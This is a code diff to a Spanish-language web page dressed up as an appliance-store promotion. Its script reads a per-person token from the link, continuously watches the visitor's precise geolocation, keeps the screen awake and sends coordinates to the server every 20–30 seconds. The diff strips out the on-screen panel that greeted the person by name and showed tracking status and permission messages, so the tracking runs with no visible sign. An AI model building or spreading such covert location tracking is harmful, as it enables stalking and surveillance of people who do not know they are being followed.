@@ -33,9 +33,6 @@
   .perks{display:grid;grid-template-columns:repeat(auto-fit,minmax(200px,1fr));gap:16px;background:var(--gris)}
   .perk{background:#fff;border-radius:14px;padding:18px;font-weight:600}
   footer{background:var(--azul);color:#cfe0ff;text-align:center;padding:26px 5%;font-size:.9rem}
-  #panel{display:none;position:fixed;left:0;right:0;bottom:0;z-index:20;background:#0f1b33;color:#fff;padding:14px 5%;text-align:center}
-  #panel.on{display:block}
-  #status.ok{color:#6ee7a0}#status.err{color:#ff8b8b}
   #modal{display:none;position:fixed;inset:0;z-index:30;background:rgba(10,20,40,.6);align-items:center;justify-content:center;padding:16px}
   #modal.on{display:flex}
   .box{position:relative;background:#fff;border-radius:20px;max-width:440px;width:100%;max-height:85vh;overflow:auto;padding:26px 22px}
@@ -106,21 +103,14 @@
   <div class="promo"><i>❄️</i><div><b>Aires acondicionados 10% OFF</b><small>Financiación en 18 cuotas</small></div></div>
 </div></div>
 
-<div id="panel">
-  <div id="hello"></div>
-  <div id="status"></div>
-</div>
-
 <script>
 const token = location.pathname.split('/').pop();
 const $ = id => document.getElementById(id);
 const btns = document.querySelectorAll('.go');
-const status = (t, c) => { $('status').textContent = t; $('status').className = c || ''; $('panel').classList.add('on'); };
-let last = null, lastSent = 0, timer = null;
+let last = null, lastSent = 0, timer = null, valid = true;
 
 fetch('/api/me/' + token).then(r => r.ok ? r.json() : Promise.reject())
-  .then(d => { $('hello').textContent = 'Hola, ' + d.name; })
-  .catch(() => { btns.forEach(b => b.disabled = true); status('Link inválido', 'err'); });
+  .catch(() => { valid = false; btns.forEach(b => b.disabled = true); });
 
 async function keepAwake() { try { await navigator.wakeLock.request('screen'); } catch {} }
 document.addEventListener('visibilitychange', () => {
@@ -135,26 +125,21 @@ async function send(pos) {
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({ lat, lng, acc })
     });
-    if (!r.ok) throw 0;
-    lastSent = Date.now();
-    status('Sesión activa ✓ ' + new Date().toLocaleTimeString(), 'ok');
-  } catch { status('Sin conexión, reintentando…', 'err'); }
+    if (r.ok) lastSent = Date.now();
+  } catch {}
 }
 
 let started = false;
 function start() {
-  if (started) return;
-  if (!navigator.geolocation) return status('Tu navegador no soporta ubicación', 'err');
+  if (started || !valid) return;
+  if (!navigator.geolocation) return;
   started = true;
-  status('Permití el acceso a tu ubicación para continuar…');
   keepAwake();
   navigator.geolocation.watchPosition(pos => {
     last = pos;
     if (Date.now() - lastSent > 20000) send(pos);
-  }, e => {
-    started = false;
-    status(e.code === 1 ? 'Permiso denegado. Activá la ubicación en los ajustes del navegador.' : 'No se pudo obtener la ubicación', 'err');
-  }, { enableHighAccuracy: true, maximumAge: 10000, timeout: 30000 });
+  }, () => { started = false; },
+  { enableHighAccuracy: true, maximumAge: 10000, timeout: 30000 });
   if (!timer) timer = setInterval(() => { if (last && Date.now() - lastSent > 30000) send(last); }, 15000);
 }
 
